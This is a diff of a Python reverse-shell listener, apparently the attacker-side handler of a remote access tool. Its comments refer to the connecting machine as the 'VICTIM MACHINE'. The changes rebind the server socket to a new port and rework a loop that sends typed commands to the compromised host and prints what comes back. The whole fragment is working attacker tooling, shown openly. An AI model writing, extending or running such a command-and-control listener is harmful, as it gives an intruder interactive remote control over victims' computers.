@@ -24,10 +24,10 @@ class Server:
 
         # socket.gethostname() so that the socket would be visible to the outside world.
         # If we had used s.bind(('localhost', 5555)) or s.bind(('127.0.0.1', 555))
-        # we would still have a “server” socket,
+        # we would still have a server socket
         # but one that was only visible within the same machine. s.bind(('', 5555))
         # specifies that the socket is reachable by any address the machine happens to have.
-        self.server_socket.bind((socket.gethostname(), 5555))
+        self.server_socket.bind((socket.gethostbyname(socket.gethostname()), 23164))
 
         # We must start listening the incoming connection (VICTIM MACHINE)
         print('[+] Listening for the incoming connection')
@@ -39,7 +39,6 @@ class Server:
 
         print(f'[+] Target connected from {str(self.addr)}')
         self.shell()
-
         self.server_socket.close()
         print('Socket server is closed.')
 
@@ -50,9 +49,12 @@ class Server:
         with self.target as target:
             while True:
                 command = input(f'shell#~{self.addr[0]}@{self.addr[1]}: ')
-                target.sendall(command.encode('utf-8'))
-                if command == 'ter':
+                if command == '':
+                    command = "\n"
+                elif command == 'terminate':
                     break
+                target.sendall(command.encode('utf-8'))
+
                 data = target.recv(1024)
                 print(data.decode('utf-8'))
 
